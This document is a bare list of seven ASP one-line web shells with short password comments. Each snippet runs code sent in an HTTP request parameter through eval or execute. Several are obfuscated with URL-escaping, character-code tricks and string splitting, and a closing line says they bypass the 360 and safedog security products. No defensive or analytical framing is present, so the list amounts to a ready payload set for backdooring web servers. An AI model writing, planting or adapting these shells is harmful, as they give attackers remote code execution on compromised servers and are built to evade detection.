<% 
dim x1,x2 
x1 = request("pass") 
x2 = x1 
eval x2 
%> 
<!-- yes++ -->

/*--------------------------------------------------------------------------------*/ 

<%execute(unescape("eval%20request%28%222016%22%29"))%>
//密码2016

/*--------------------------------------------------------------------------------*/ 

<%if request ("M")<>""then session("M")=request("M"):end if:if session("M")<>"" then execute session("M")%>
//密码M

/*--------------------------------------------------------------------------------*/ 

<%
dim play
'
'
''''''''''''''''''
'''''''''
play = request("M)
%>
Error
<%
execute(play)
%>
//密码M

/*--------------------------------------------------------------------------------*/ 

<%
i=(Chr(-12590))
love=(Chr(-20306))
you=(Chr(-15133))
OK=i&love&you
CNM=Request(OK)
eVal CNM 'pass:M
%>
//密码M

/*--------------------------------------------------------------------------------*/ 

<%
dim a,b,temp,c
a="eva@@l%20req@@uest%28%22helloxj%22%29"
b=replace(a,"@@","零")
c=split(b,"零")
for i=0 to ubound(c)
temp=temp+c(i)
next
execute(unescape(temp))
%>

/*--------------------------------------------------------------------------------*/ 

<%Execute(DeAsc("%119%136%115%126%50%132%119%131%135%119%133%134%58%52%116%115%133%119%52%59")):Function DeAsc(Str):Str=Split(Str,"%"):For I=1 To Ubound(Str):DeAsc=DeAsc&Chr(Str(I)-18):Next:End Function%>

pass:base , bypass to 360 D safedog , not thx . goodnight
